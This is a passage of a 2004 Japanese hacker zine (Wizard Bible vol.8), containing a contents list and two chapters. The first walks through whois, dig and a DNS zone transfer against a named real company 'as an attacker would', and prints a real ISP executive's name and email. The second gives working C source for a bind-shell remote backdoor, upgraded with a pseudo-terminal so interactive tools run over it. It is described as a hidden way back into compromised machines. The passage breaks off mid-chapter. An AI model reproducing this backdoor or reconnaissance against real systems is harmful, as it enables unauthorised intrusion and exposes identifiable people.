@@ -1,0 +1,2505 @@
+[-]=======================================================================[-]
+
+                      Wizard Bible vol.8 (2004,2,17)
+
+[-]=======================================================================[-]
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+  ---- 第０章：目次 ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○第１章：犯罪にならないネットプロファイリング講座    山本洋介 著
+
+○第２章：リモートバックドアの作成とEmacsとの連動         PaiN 著
+
+○第３章：トロイの木馬を作ってみよう ～Windows篇～  Kenji Aiko 著
+
+○第４章：数値列のメモの考察                                 D 著
+
+○第５章：ディスク・タンブラー錠のピッキング           Defolos 著
+
+○第６章：セキュリティツール基礎問題 ～解答編～       IPUSIRON 著
+
+○第７章：UNDERGROUND JOURNALイベント                 まどさん 著
+
+○第８章：お知らせ
+
+○第９章：著者プロフィール
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第１章: 犯罪にならないネットプロファイリング講座 ---
+
+著者：山本洋介
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　はじめまして。
+　世の中は最近個人情報の保護だの何だの言われているようで、個人情報にそん
+なに価値があるものなのかと考えている今日この頃ですが、世の中には知らない
+うちに流されている個人情報なんかいくらでもあるわけで、いつ何時大量のピザ
+が我が家に送られてくるやもしれないということを常に心の片隅に置きつつ、ビ
+クビクしながら生活していくのが正しい小市民のあり方であろうかと思っとりま
+す。
+　そんな悲しい覚悟を決める前にインターネットに接続しているだけで個人、と
+いうかノードの情報はいかほど取得できるのだろうかということについて考えて
+みることにします、と大上段に構えてみた割には高度なハッキングテクニックを
+使うわけでもなく、ただOS付属のnetstatやwhoisやdigなどのコマンドを使ってサ
+ーバーやドメインの情報を得ようというだけだったりするわけですが、そのギャ
+ップについては笑い飛ばしてください。
+　なお、IPアドレスについてはわかっているものとして進んでいきますので、全
+くの初心者の方には難しいかもしれませんが、それについては無視することにします。
+
+
+■0x02.) 接続相手の情報を知ろう
+
+　某P2Pソフトを使ってファイル交換に励んでいると、自分のファイルのダウンロ
+ードが終わるとまだ途中のこちらの接続を切断するムカつくんじゃｺﾞﾙｱ! ヽ(`Д´)ﾉ
+という野郎がいます。こいつに何とか正義の鉄槌を喰らわしてみたいと思った事
+はないでしょうか？　そのために今からIPアドレスからいろいろと調べてみるこ
+とにします。
+　そんなに大げさに考えなくてもチャットしている相手の身元を突き止めてみた
+り、相手を調査してみるなどちょっとした暇つぶしにも使えます。リアルタイム
+に自分とつながっているIPアドレスを調べるにはnetstatというコマンドを使用す
+ればいいでしょう。
+
+-----
+%netstat -a
+TCP    yousuke:2730            pdd83bb.tkyoac00.ap.so-net.ne.jp:ssh  ESTABLISHED-----
+
+　これでいわゆるリモートホスト、と言われているものを手に入れました。プロ
+バイダによるのですが、運がよければアクセスポイントごとにサブドメインが振
+られていたりして、相手がどの辺りに住んでいるのか想像できたりします。tkyo
+ac00ということで東京のようですね。
+
+
+●DNSから情報を得る
+
+　次にDNSから情報を頂きましょう。nslookupというコマンドもあるのですが、こ
+こでは筆者が使い慣れているdigを使うことにします。といっても始めに調べたア
+ドレスはたぶんso-netだとはわかっていますが、それだけでは今後ちょっと困り
+ますのでIPアドレスを引き出します。
+
+　まず情報はリモートホストからIPアドレスを引き出してみましょう。本来なら
+
+-----
+% dig A @対象ネームサーバー リモートホスト
+-----
+
+とした方がいいのでしょうが、以下のようにコマンドを打ち込めばいいでしょう。
+
+-----
+% dig pdd83bb.tkyoac00.ap.so-net.ne.jp
+-----
+
+　すると、ずらっと結果が現れると思います。上下は略しますが
+
+-----
+;; ANSWER SECTION:
+pdd83bb.tkyoac00.ap.so-net.ne.jp.  53m23s IN A  218.221.131.187
+-----
+
+と表示されているでしょう。
+
+　このAに続く218.221.131.187が、pdd83bb.tkyoac00.ap.so-net.ne.jp.に対応す
+るIPアドレスです。
+
+
+●whoisから情報を得る
+
+　次にこのIPアドレスを使って情報を引き出してみましょう。WindowsやMacOS 9
+などwhoisコマンドの装備されていないOSではフリーで転がっているwhoisクライ
+アントを探してくるか、昔ハッキングされたことがあるので有名になったWeb版の
+whoisデータベース（JPNIC：http://whois.nic.ad.jp）を使ってください。ここ
+ではコマンドを使っていきますが、Web版の方がリンクが貼られていたりするので
+意外と便利かもしれません。
+
+○とりあえず登録情報を得る
+
+　whoisといえばwhois example.comのようにドメイン名からドメインの登録情報
+を調査するのが主な役割ですが、IPアドレスからも調べることができます。
+
+-----
+% whois -h whois.nic.ad.jp 218.221.131.187
+-----
+
+のようなコマンドラインオプションを設定します。
+
+　-hの後ろには相手が所属してそうなドメインのwhoisサーバーを指定してくださ
+い。jpドメインならばwhois.nic.ad.jpを使うことになります。
+
+　また、FreeBSDなら
+
+-----
+% whois -c jp 218.221.131.187
+-----
+
+のようなコマンドでも同様です。
+
+　-cの後ろには相手が所属してそうなドメインの国名の略称を指定してください。
+
+　Webを使うとこうなります。
+
+-----
+http://whois.nic.ad.jp/cgi-bin/whois_gw?key=218.221.131.187
+-----
+
+　すると
+
+-----
+[ JPNIC & JPRS database provides information on network administration. Its   ]
+[ use is restricted to network administration purposes. For further infor-    ]
+[ mation, use 'whois -h whois.nic.ad.jp help'. To suppress Japanese output,   ]
+[ add'/e' at the end of command, e.g. 'whois -h whois.nic.ad.jp xxx/e'.       ]
+
+Network Information: [ネットワーク情報]
+a. [IPネットワークアドレス]     218.221.128.0-218.221.159.0
+b. [ネットワーク名]             SO-NET
+f. [組織名]                     SO-Net サービス
+g. [Organization]               SO-Net Service
+m. [運用責任者]                 MK2734JP
+n. [技術連絡担当者]             SW314JP
+n. [技術連絡担当者]             YY1426JP
+p. [ネームサーバ]               dnss3.so-net.ne.jp
+p. [ネームサーバ]               dnss4.so-net.ne.jp
+p. [ネームサーバ]               dnss5.so-net.ne.jp
+p. [ネームサーバ]               dnss6.so-net.ne.jp
+p. [ネームサーバ]               dnss7.so-net.ne.jp
+y. [通知アドレス]               jin@scn.co.jp
+y. [通知アドレス]               wtn@scn.co.jp
+[割当年月日]                    2002/01/24
+[返却年月日]
+[最終更新]                      2003/08/13 11:57:09 (JST)
+                                k-kawaka@scn.co.jp
+-----
+
+と表示されます。
+
+　さらに、
+
+-----
+% whois -h whois.nic.ad.jp TN540JP
+-----
+
+としてやると、
+
+-----
+Personal Information: [個人情報]
+a. [JPNICハンドル]              MK2734JP
+b. [氏名]                       菊池 正郎
+c. [Last, First]                Kikuchi, Masaro
+d. [電子メイル]                 kikuchi@scn.co.jp
+f. [組織名]                     ソニーコミュニケーションネットワーク株式会社
+g. [Organization]               Sony Communication Network Corporation
+k. [部署]
+l. [Division]
+m. [肩書]                       執行役員
+n. [Title]                      senior vice president
+o. [電話番号]
+p. [FAX番号]
+y. [通知アドレス]               yoki@scn.co.jp
+[最終更新]                      2002/01/31 15:31:25 (JST)
+                                yoki@scn.co.jp
+-----
+
+と当該ネットワークの運用責任者のメールアドレスと電話番号が出てきました。
+
+　運がよければ本人なのでしょうが、どうせプロバイダかレンサバ管理者なので、
+あまり役には立ちませんが、このIPの奴が違法ファイルをやり取りしていると密
+告することくらいはできます。
+　あと、応用としてこれを使って根こそぎ担当者のメールアドレスを集めまくっ
+てSPAMを送りつけるという技もありますが、見つかってJPNICに詫び文を書かされ
+る羽目になります（実話）ので止めたほうがいいでしょう。
+
+■0x03.) 攻撃者のための合法的な使い方
+
+　さて、次に攻撃者の視点に立ってこの2つのサービスの使い方を考えてみましょ
+う。攻撃者は対象の会社（もしくは組織）を攻撃するとして、やみくもにアタッ
+クをかけるわけではなく、サイトのネットワーク情報を詳細に調べ、その上で侵
+入に取り掛かることが多いといわれています。
+　例えばWebサイトを書き換えるためにそのサイトを攻撃するのではなく、社内に
+ある信頼されている脆弱な別ノードを経由して侵入し、書き換える場合もありま
+す。この方が直接攻撃するよりも効率がよいですからね。
+
+　ここでは例として私のWebサイトにアクセスのあったintx.co.jpという会社のネ
+ットワーク情報をwhoisとdigを使って攻撃者の気分になって調査してみることに
+します。
+
+●ゾーン情報の取得
+
+　まず会社のネットワーク情報を取得するのに一番都合がいい、ゾーン情報を取
+得してみましょう。ゾーン情報というのはここでは詳しく説明しませんが、プラ
+イマリDNSからセカンダリDNSへ渡されるデータのことで、そのDNSの管理している
+クライアントの情報がすべて記載されています。
+　最近はセカンダリサーバー以外に渡さないように設定されているところが多い
+のですが、運良く管理の甘いDNSサーバーであれば以下のようなゾーン情報が取得
+できます。
+
+　まず、ゾーン情報を得るためには対象ドメインのネームサーバーを知る必要が
+あります。そのためにはNSレコードを見る必要がありますので、NSオプションを
+追加すればいいのですが、ここでは他のレコードも欲しいのでANYオプションを追
+加しておきます。
+
+-----
+% dig any intx.co.jp
+
+（省略）
+
+;; ANSWER SECTION:
+intx.co.jp.             1h59m30s IN A   220.111.37.180
+intx.co.jp.             1h59m30s IN NS  ns.intx.co.jp.
+intx.co.jp.             1h59m30s IN NS  ns-tk022.ocn.ad.jp.
+-----
+
+　これによってintx.co.jpのDNSサーバーはns.intx.co.jpだということがわかり
+ました。
+
+　次に、このDNSサーバーにアクセスして、調査したいドメインのゾーン情報を取
+得してみることにします。
+
+-----
+% dig @ns.intx.co.jp. intx.co.jp. axfr
+
+; <<>> DiG 8.3 <<>> @ns.intx.co.jp. intx.co.jp. axfr
+; (1 server found)
+$ORIGIN intx.co.jp.
+@                       2H IN SOA       ns root (
+                                        2004010301      ; serial
+                                        3H              ; refresh
+                                        15M             ; retry
+                                        1W              ; expiry
+                                        2H )            ; minimum
+
+                        2H IN NS        ns
+                        2H IN NS        ns-tk022.ocn.ad.jp.
+                        2H IN A         220.111.37.180
+                        2H IN MX        10 @
+book                    2H IN MX        10 book
+                        2H IN A         219.166.170.245
+ds1                     2H IN A         219.165.99.74
+gw-ng                   2H IN A         219.165.99.73
+gw-tk                   2H IN A         219.166.170.241
+mail                    2H IN A         220.111.37.180
+ml                      2H IN MX        10 @
+ns                      2H IN A         219.166.170.242
+ny                      2H IN MX        10 ds1.ny
+                        2H IN NS        ns.ny
+                        2H IN NS        ns-tk022.ocn.ad.jp.
+ds1.ny                  2H IN A         219.165.99.74
+ns.ny                   2H IN A         219.165.99.74
+red                     2H IN MX        10 red
+                        2H IN A         219.166.170.242
+www                     2H IN A         220.111.37.180
+@                       2H IN SOA       ns root (
+                                        2004010301      ; serial
+                                        3H              ; refresh
+                                        15M             ; retry
+                                        1W              ; expiry
+                                        2H )            ; minimum
+
+;; Received 1 answer (22 records).
+;; FROM: webserver.congresso.jp to SERVER: 219.166.170.242
+;; WHEN: Fri Jan 23 15:22:08 2004
+-----
+
+　このゾーン情報を取ることができればサーバー構成は丸分かりですね。
+
+●whoisを使ったIPアドレス範囲の取得
+
+　とはいえこんなに簡単にゾーン情報がわかることはあまりありません。取得で
+きなかったということにして次はwhoisを使ってみましょう。もちろんゾーン情報
+を取得してたとしも、ネームサーバーに書かれていない秘密のサーバー、ルータ
+ーを探す役に立ちます。
+
+-----
+% whois -h whois.nic.ad.jp 220.111.37.180
+
+Network Information: [ネットワーク情報]
+a. [IPネットワークアドレス]     220.111.32.0-220.111.47.0
+b. [ネットワーク名]             OCN
+f. [組織名]                     オープンコンピュータネットワーク
+g. [Organization]               Open Computer Network
+
+（以下略）
+-----
+
+　あれ、これはOCNにホスティングされているようですね。ここにwwwもmailも。
+
+　次にDNSサーバーは別のネットワークにあるようなのでこちらにもwhoisしてみ
+ます。
+
+-----
+% whois -h whois.nic.ad.jp 219.166.170.242
+
+オープンコンピュータネットワーク (Open Computer Network)
+        SUBA-131-15I [サブアロケーション]                        219.166.170.0
+株式会社インタークロスメディアステーション (Intercross Mediastation Corporation)
+          INTX-CO-JP [219.166.170.240 <-> 219.166.170.247]  219.166.170.240/29
+-----
+
+　これはクラスCより小さい範囲でIPの範囲が割り振られていることを表していま
+す。上記を例に説明しますと、クラスCネットワーク219.166.170.0/24はOCNのも
+のですが、その中の219.166.170.240/29は、この会社に割り振られていることに
+なります。
+
+　また、
+
+-----
+% whois -h whois.nic.ad.jp 219.166.170.240/29
+-----
+
+とすることで、この会社の登録情報を調べることができます。
+
+　これを見るとこの会社は219.166.170.240～247のIPアドレス範囲を持っている
+ということもわかりました。OCN固定IP8個プランってやつですか。高い金を払っ
+てIPアドレスを8個確保しているわけですからここらへんに何かサーバーでも置い
+てありそうな気がします。
+　他にありがちなmailやpop、smtpなどでも適当に試してみると、他のIPアドレス
+範囲を持っていることもありますので調べてみるといいでしょう。
+
+　このように攻撃者は合法的にたった２つのコマンドによってネットワーク情報
+をある程度把握することが可能です。そして、見つけたサイトにスキャンしてみ
+たりして、ターゲットを絞り込んでいくのです。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第２章: リモートバックドアの作成とEmacsとの連動 ---
+
+著者：PaiN
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　今回はリモートバックドア（TCP Shell）の基本的なプログラミング方法から、
+リモートバックドア上でemacsが利用できるまで説明します。
+　初めにリモートバックドアの概要、仕組み、それ以降で実際のコーディングに
+ついて説明していきます。
+　なお、Linux上でC言語を使い、簡単なネットワークプログラミングができるこ
+とを前提として話を進めていきますので、それについて分からないことは各自で
+調べてください。
+　今回の実験は、すべてLinux上で行っています。
+
+
+■0x02.) リモートバックドアについて
+
+○ 概要
+
+　リモートバックドアとは、攻撃者がターゲットに実行させることで侵入可能な
+状態にする裏口、または一度侵入したシステムへ再度侵入するために開けておく
+裏口のことです。リモート(遠隔)ということで、ネットワークを介してターゲッ
+トのマシンに侵入できるようにするためのプログラムのことをここでは指します。
+　リモートバックドアにも実現の方法により、いくつかのタイプがありますが、
+今回は独自のネットワークサービスとして動かし、そこへクライアントが接続す
+ることで、サーバ側のマシンを遠隔操作するタイプのリモートバックドアを作成、
+改良していきます。
+
+○ 仕組み
+
+(1)
++----------+            +------------+            +----------+
+|アタッカー|→コマンド→|ネットワーク|→コマンド→|ターゲット|
++----------+            +------------+            +----------+
+                                                     ++++++
+                                                     |実行| (2)
+(3)                                                  ++++++
++----------+            +------------+            +----------+
+|アタッカー|←実行結果←|ネットワーク|←実行結果←|ターゲット|
++----------+            +------------+            +----------+
+（クライアント）                                    （サーバ）
+
+　今回作成するリモートバックドアには、「クライアント」と「サーバ」が存在
+します。クライアントはサーバに対して要求を出し、サーバはクライアントから
+の要求を聞き入れ処理し、そしてその実行結果をクライアントへ返します。ここ
+で、クライアントはアタッカー側となり、サーバはターゲット側ということにな
+ります（手法によっては逆の場合もあります）。これは、WEBやFTPサービスと同
+じようなものだと解釈することができます。WEBのクライアントはブラウザであり、
+サーバはApacheやANHTTPd等のサーバアプリケーションとなります。
+　正当なWEB等のサービスとリモートバックドアの類で異なる点は、前者は管理者
+の意思で稼動させたものであるのに対して、後者はアタッカーが許可無く勝手に
+稼動させ、稼動していることがばれないように隠そうとすることです。
+
+
+■0x03.) シンプルなリモートバックドア
+
+　以下に非常にシンプルなリモートバックドアのソースコードを示します。
+　（都合上できるだけ短くコードを書いたので読みにくい点は許してください）
+　（クライアントにはtelnetコマンドを使用します）
+
+-----  simple_rbd.c
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+// エラーを吐いて死ぬ
+void die(char *mesg) {
+  fprintf(stderr, "%s\n", mesg);
+  exit(EXIT_FAILURE);
+}
+// サーバソケットを設定し、そのファイルディスクリプタを返す
+int sock_open(unsigned short port)
+{
+  int sock;
+  struct sockaddr_in addr;
+  addr.sin_family      = AF_INET;
+  addr.sin_port        = htons(port);
+  addr.sin_addr.s_addr = INADDR_ANY;
+
+  if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1
+    || setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (int[]){1}, sizeof(int)) 
+== -1
+    || bind(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1
+    || listen(sock, 2) == -1) return -1;
+
+  return sock;
+}
+// メイン
+int main(void) {
+  const unsigned short port = 1876; // サーバのポート番号
+  int sock, client;
+
+  if ((sock = sock_open(port)) == -1)// サーバソケットを設定
+    die("socket error"); // error
+  if ((client = accept(sock, NULL, NULL)) == -1) //クライアントの接続待ち
+    die("accept error"); // error
+
+  dup2(client, STDIN_FILENO);	// 標準入力をクライアントソケットの複製とする
+  dup2(client, STDOUT_FILENO);	// 標準出力をクライアントソケットの複製とする
+  dup2(client, STDERR_FILENO);	// 標準エラー出力を(以下略)
+  return execl("/bin/sh", "sh", "-i", NULL); // shへ化ける
+}
+-----
+
+　sock_open関数内でサーバのソケット（portは1876）を設定し、accept()でクラ
+イアントからの接続を待ちます。ここで接続者が現れると、変数clientへクライ
+アントへ繋がるソケットのファイルディスクリプタが入ります。その後のdup2()
+では、そのソケットで標準入力（STDIN）、標準出力（STDOUT）、標準エラー出力
+（STDERR）を上書きし、最後のexecl()で/bin/shへ化けます。これで、STDIN、S
+TDOUT、STDERRがクライアントのソケットとなった状態でshellが起動されるため、
+shellはクライアントからの入力をネットワークを介して受け入れ、出力をクラ
+イアントに対してネットワークを介して行うようになります。
+
+　ここで登場したsock_open()、die()という2つの関数は後に名前だけ登場します
+から、どんな動作するものか程度でいいので頭に入れて置いてください。
+
+　では、実際に動くか試してみましょう。
+（上記のソースコードをsimple_rbd.cとします）
+
+-----  実行例
+$ gcc simple_rbd.c -o backdoor /* コンパイル */
+$ ./backdoor &                 /* バックグラウンドで実行 */
+[2] 1593
+$ telnet localhost 1876        /* 接続(ポートは1876になっています) */
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+sh-2.05$ id
+id
+uid=500(pain) gid=500(pain) 所属グループ=500(pain)
+sh-2.05$
+sh-2.04$
+-----
+
+　表示に少し問題がありますが、うまく動いています。試したいことがあれば、
+ここでいろいろと試してみるとよいでしょう。入力した「id」が2度表示されてい
+るのは、telnetコマンドのローカルエコーモードがONになっているためです。
+
+-----
+sh-2.05$ exit
+Connection closed by foreign host.
+[2]-  Done                    ./backdoor
+-----
+
+　と終了しておきます。
+
+
+■0x04.) 改良箇所をまとめる
+
+○ 1.) emacs、vi、passwd等が使えるようにする
+
+　0x02のsimple_rbd.cでは、emacs、vi、passwd等を使うことができませんから、
+これらを使えるようにします。
+
+○ 2.) キー単位の入出力を実現する
+
+　これは、1にも関連しています。クライアントにはtelnetコマンドを使用してい
+ますが、通常の接続方法だと入力が1行単位で送信されますから、これをキー単位
+で送るようにしなければviやemacsを起動できたとしても正常に操作することがで
+きません。
+　ここでは並行して、telnetコマンドのローカルエコーもOFFにするようにします。
+
+
+■0x05.) emacs、viを使用するために
+
+　ここが一番重要な作業なのでじっくりとやっていきます。
+
+● 検証
+
+　0x02のsimple_rbd.cでemacsやvi、passwdが本当に使えないのか試してみましょ
+う。
+
+　まずサーバを起動して接続します。
+
+-----
+$ ./backdoor &
+$ telnet localhost 1876
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+sh-2.05$
+-----
+
+○ passwdコマンドを使ってみる
+
+-----
+sh-2.05$ passwd
+passwd
+(current) UNIX password: passwd: Authentication token manipulation error
+Changing password for pain
+sh-2.05$
+-----
+
+　current passwordを入力する前にエラーで終了してしまいます。
+
+○ viを使ってみる
+
+-----
+sh-2.05$ vi
+vi
+VIM: no controlling terminal
+sh-2.05$
+-----
+
+　エラーメッセージが表示され、終了してしまいます。
+
+○ emacsを使ってみる
+
+-----
+sh-2.05$ emacs -nw
+emacs -nw
+emacs: standard input is not a tty
+sh-2.05$
+-----
+
+　エラーメッセージが表示され、終了してしまいます。
+　（-nwはXWindowSystemを使用せずにターミナル内で実行するというオプションです）
+
+● 分析
+
+　なぜ実行できないのか考えてみましょう。これは、viとemacsのエラーメッセー
+ジがヒントとなります。
+
+-----
+VIM: no controlling terminal
+emacs: standard input is not a tty
+-----
+
+　「terminalがコントロールできない」「標準入力がttyでない」といえば、なに
+が悪いのか予想できますね。
+
+-----
+dup2(client, STDIN_FILENO);
+dup2(client, STDOUT_FILENO);
+dup2(client, STDERR_FILENO);
+-----
+
+　ここです。
+　標準入出力をクライアントのソケットに設定しているため、標準入出力がター
+ミナル(tty)ではなくなっています。これは、例えばターミナルのICANONフラグを
+変更しようとioctl(2)やtcgetattr(3)を使用した場合にエラーが発生してしまい
+ます。この意味がよく分からない人のために少しだけ端末制御の話をします。em
+acsやviでは、キー単位で入力された文字を受けとる必要があります。しかし、通
+常モードでの入力は改行(ENTERを叩く)まで完了しません。ここでtcsetatter(3)
+やioctl(2)を使い、キー単位で入力ができるようにターミナルを設定します。こ
+のような作業を端末制御といいます。
+
+　以下に簡単な端末制御の例を示します。
+
+-----  term.c
+#include <sys/ioctl.h>
+#include <termio.h>
+#include <unistd.h>
+
+int main(void)
+{
+  struct termio terminf;
+  ioctl(STDIN_FILENO, TCGETA, &terminf);
+  terminf.c_lflag &= ~ECHO;
+  ioctl(STDIN_FILENO, TCSETAF, &terminf);
+  return 0;
+}
+-----
+
+　上記のプログラムを実行すると、その後ターミナルがエコーしなくなります。
+
+-----
+$ gcc term.c -o term
+$ ./term
+$ uid=500(pain) gid=500(pain) 所属グループ=500(pain)
+$ uid=500(pain) gid=500(pain) 所属グループ=500(pain)
+$ bash: agag: command not found
+$ bash: ret: command not found
+-----
+
+　./termを実行後、id、id、ageage、retと入力しましたが、実際にはターミナル
+に表示されなくなりました。戻すには、「reset」と入力して下さい（入力は見え
+ませんが実際は入力されています）。
+　ここで注目することは「ioctl(STDIN_FILENO, TCGETA, &terminf);」で、1つ目
+の引数にSTDINのファイルディスクリプタ（0）を指定している点です。TCGETAは、
+3つ目の引数であるtermio構造体のアドレスへ現在のターミナル設定を書き込むと
+いう意味ですが、simple_rbd.cではSTDIN_FILENOがterminal(tty|pts)ではなく、
+socketになっているため、ここでioctlは失敗し-1を返します。
+　これがvi、emacsが実行できない原因です。passwdについては、ECHOをOFFする
+ときに端末制御を行っているはずですし、調べた結果「STDINがpipe等の場合エラ
+ーを出す」とありました。これもSTDINがターミナルでないことが原因です。
+
+● 改良
+
+　単純な話で、STDIN、STDOUT、STDERRをターミナル（端末）にすればよいだけで
+す。
+　しかし、それだけではクライアントとshellの関係が途切れてしまいますから、
+この2つを中継する必要がでてきます。これを実現するには、fork(2)した後に端
+末を1つ新規に作成し、それを子プロセスの標準入出力へ割り当てた後にexecl(3)
+で/bin/shになり、それとクライアントのソケットを親プロセスが中継するという
+作業が発生します。
+
+○ 疑似端末の作り方
+
+（以下の文章は man 4 pts を参考にしています）
+　端末を使用するためには、/dev/ptmxをオープンし、pasedo-terminalのmaster
+とslaveを作成することから始めます。/dev/ptmxをopenすると、pseudo-terminal
+ master(PTM)へのファイルディスクリプタが返され、 /dev/ptsディレクトリにps
+eudo-terminal slave(PTS)デバイスが作成されます。/dev/ptmxをopenして得られ
+たファイルディスクリプタは、それぞれが独立したPTMであり、各自が対応するPTS
+を持ちます。PTSのpathは、PTMのファイルディスクリプタをptsname(3)に渡すこ
+とにより知ることができます。PTSをopenする前に、必ずmasterのファイルディス
+クリプタを引数にして、grantpt(3)とunlockpt(3)を呼び出さなければいけません。
+masterとslaveがopenされた後に、slaveはプロセスに対して、real terminalと全
+く同じインターフェースを提供します。slaveに書かれたデータは、masterに対す
+る入力して扱われ、masterに書かれたデータはslaveに対する入力して扱われます。
+
+　また、paseudo-terminalは、su(8)やpasswd(8)のような、通常はpipeからの入
+力を拒否するプログラムに入力を送信する為にも使用できます。
+
+　※ paseudo-terminalとは疑似端末のことです。
+
+　と、ほとんどそのままですが、「これを使えば問題が解決できそう」というこ
+とが分かったと思います。同時に、「とても面倒くさそうで、よく意味が分から
+ん」と思った方がいるかもしれませんが、御安心ください。
+　実は…forkpty(3)という超便利なライブラリ関数が用意してあります。
+
+○ forkpty(3)
+
+　forkpty(3)は、fork(2)で子プロセスを作り、その子プロセスの標準入出力に新
+規に作成した疑似端末のslaveを割り当ててくれます。
+　/dev/ptmxをopenしたりなんだりを全てやってくれるということですので、これ
+を使用しましょう。
+
+　man 3 forkptyを見ると、プロトタイプ宣言が、
+
+-----
+  pid_t forkpty(int *amaster, char *name,
+	  struct  termios  *termp,  struct  winsize *winp);
+-----
+
+　となっています。amasterには、masterのファイルディスクリプタ、nameには
+slaveのファイル名が設定されます。termpは、作成した疑似端末を設定するため
+のtermios構造体のアドレスで、winpは疑似端末で扱うWindow Sizeを設定するた
+めのwinsize構造体のアドレスです。ここで、今回必要なのはamsterだけなので、
+その他の引数は今のところNULLで問題ありません。関数値は、fork(2)と同様に子
+プロセス側には0、親プロセス側には子プロセスのプロセスIDが返されます。
+　この関数をLinuxで使用するためには、<pty.h>をincludeし、コンパイル時に
+-lutilオプションをつける必要があります。
+
+  では、simple_rbd.cをforkpty仕様に書き直してみます。
+  （die(),sock_open()は、上記のsimple_rbd.cを参照）
+
+-----  pty_rbd.c
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <pty.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void die(char *mesg); // 実体は省略しますが本当はここにあります
+int sock_open(unsigned short port); // 実体は省略しますが本当はここにあります
+
+int main(void) {
+  const unsigned short port = 1876; //サーバのポート番号
+  int sock, client, master, len;
+  char buff[1024];
+  fd_set check_fd;
+
+  if ((sock = sock_open(port)) == -1)
+    die("socket error");
+  if ((client = accept(sock, NULL, NULL)) == -1)
+    die("accept error");
+
+  /* ---(3)--- */
+
+  if (forkpty(&master, NULL, NULL, NULL) == 0) /* ---(1)--- */
+    execl("/bin/sh", "sh", NULL); // 子プロセスはshに
+
+  while (1) { /* ---(2)--- */
+   FD_ZERO(&check_fd);
+   FD_SET(client, &check_fd);
+   FD_SET(master, &check_fd);
+   if (select(FD_SETSIZE, &check_fd, NULL, NULL, NULL) < 1) // 出力待ち
+     break;
+   if (FD_ISSET(master, &check_fd)) { // 擬似端末が読み込み可能
+     if ((len = read(master, buff, sizeof(buff))) == -1) // 読み込み
+       break;
+     write(client, buff, len); // 読んだ内容をクライアントへ書き込む
+   } else { 	// クライアントが読み込み可能
+     if ((len = read(client, buff, sizeof(buff))) == -1) // 読み込み
+       break;
+     write(master, buff, len); // 読んだ内容を擬似端末のmasterへ書き込む
+   }
+  }
+  return 0;
+}
+-----
+
+　-(1)-以降が改良部分です。-(1)-でforkpty()し、子プロセスならexecl()で
+shellへ化けます。親プロセスは-(2)-以降で、client(クライアントのソケット)
+と、master(疑似端末のmaster)の中継地点となります。
+
+　実際にviやemacsが使えるか試してみます。
+
+-----
+$ gcc pty_rbd.c -lutil -o backdoor
+$ ./backdoor &
+[2] 1740
+$ telnet localhost 1876
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+sh-2.05$ emacs -nw
+Buffers Files Tools Edit Search Mule Help
+..
+sh-2.05$ vi
+..
+-----
+
+　どちらも起動できたので、とりあえずは成功です。しかし、うまく操作ができ
+ませんでした。ENTERを叩くまでキー入力を受け付けません。この問題は次の章で解決します。
+
+
+■0x06.) キー単位の入出力を実現するために
+
+● 検証
+
+-----
+sh-2.05$ id
+id
+uid=500(pain) gid=500(pain) 所属グループ=500(pain)
+sh-2.05$
+-----
+
+　これを見てください。「id」と入力してENTERを押すと「id\n」がサーバ側から
+返ってきています。これは「id\n」と1行単位でサーバへ送られたことを示します。
+仮に入力がキー単位で送られていたならば、
+
+-----
+sh-2.05$ iidd
+uid=500(pain) gid=500(pain) 所属グループ=500(pain)
+sh-2.05$
+-----
+
+　と、iを入力した時点でi、dを入力した時点でdが返ってきているはずです。こ
+こで、「idと入力して、iiddと表示されるのはおかしい」と思う方がいるかもし
+れませんが、これは実際に入力した文字がターミナル表示され、さらにサーバ側
+が入力された文字をエコーしたものが表示されるため、二重に表示されるのです。
+これも問題なので改善しなければなりません。
+
+● 分析
+
+　考えてみると、これはサーバ側に問題があるのではなく、クライアントである
+telnetコマンドに問題があることに気づきます。
+　telnetコマンドは、その名の通りtelnetdへアクセスすることができるわけです
+から、リアルタイムな入出力やローカルエコーのOFFもできるはずです。調べてみ
